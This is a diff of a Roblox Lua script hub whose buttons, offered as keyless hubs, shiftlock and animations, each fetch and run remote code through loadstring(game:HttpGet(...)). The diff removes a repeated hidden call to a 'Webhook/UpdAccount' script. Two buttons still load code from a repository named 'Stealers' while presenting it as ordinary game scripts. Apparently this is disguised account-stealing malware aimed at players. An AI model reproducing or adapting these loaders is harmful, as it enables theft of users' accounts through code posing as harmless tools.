@@ -7,7 +7,6 @@ tab.newButton(
     "Yarhm Hub",
     "Status: 🟢 This is Keyless! ^^",
     function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/TylerHIP/Webhook/main/UpdAccount"))()
 loadstring(game:HttpGet("https://github.com/TylerHIP/Stealers/raw/roblox/Muscle.lua"))()
 
     end
@@ -17,7 +16,6 @@ tab.newButton(
     "X Hub",
     "Status: 🟢 This is keyless! ^^",
     function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/TylerHIP/Webhook/main/UpdAccount"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/TylerHIP/Stealers/roblox/GuiHalloween.lua"))()
     end
 )
@@ -26,7 +24,6 @@ tab.newButton(
     "Movable and Permanent shiftlock",
     "Status: 🟢 Also working in any game!",
     function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/TylerHIP/Webhook/main/UpdAccount"))()
 loadstring(game:HttpGet('https://raw.githubusercontent.com/Unknownproooolucky/Unknown-Hub-X-Universal-Games/main/Universal/Permanent-Shiftlock-V2'))()
     end
 )
@@ -35,7 +32,6 @@ tab.newButton(
     "FE Animations",
     "Status: 🟢 It has The new Animations!!",
     function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/TylerHIP/Webhook/main/UpdAccount"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Gazer-Ha/Animated/main/G", true))()
     end
 )
